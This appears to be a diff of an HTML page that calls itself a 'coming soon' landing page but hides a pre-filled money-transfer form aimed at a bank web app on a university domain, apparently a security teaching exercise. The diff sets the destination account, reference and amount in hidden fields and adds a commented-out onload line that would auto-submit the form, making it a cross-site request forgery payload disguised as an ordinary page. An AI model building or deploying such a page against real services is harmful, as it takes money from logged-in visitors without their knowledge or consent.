@@ -1,12 +1,13 @@
 about me page/landing page - coming soon
 <a href="https://robthebank.soton.ac.uk/help?page=accounts" > click me ! </a>
+<!-- <body onload="document.forms[0].submit()"> -->
 
-
-<form action="https://robthebank.soton.ac.uk/transactions/transfer" class="well" id="TransactionTransferForm" method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"></div>
+<form action="https://robthebank.soton.ac.uk/transactions/transfer" class="well" id="TransactionTransferForm" method="post" accept-charset="utf-8"><div style="display:none;">
+ <input type="hidden" name="_method" value="POST"></div>
  <div class="form-group required"><label for="TransactionTo">Transfer to account</label>
-   <input  type="hidden"  class="form-control" type="number" id="TransactionTo" required="required"></div>
+   <input  type="hidden"  class="form-control" type="number" id="TransactionTo" required="required" value=120></div>
   <div class="form-group required"><label for="TransactionReference">Reference</label>
-    <input  type="hidden"  name="data[Transaction][reference]" class="form-control" maxlength="255" type="text" id="TransactionReference" required="required"></div><div class="form-group required">
+    <input  type="hidden"  name="data[Transaction][reference]" value="djbfvbd" class="form-control" maxlength="255" type="text" id="TransactionReference" required="required"></div><div class="form-group required">
  <label for="TransactionAmount">Amount to transfer</label>
  <input type="hidden" name="data[Transaction][amount]" class="form-control" style="width: 100px" value=1 step="any" type="number" id="TransactionAmount" required="required"></div>
 <div class="form-group"><input class="btn btn-primary" type="submit" value="Make Transaction"></div></form>
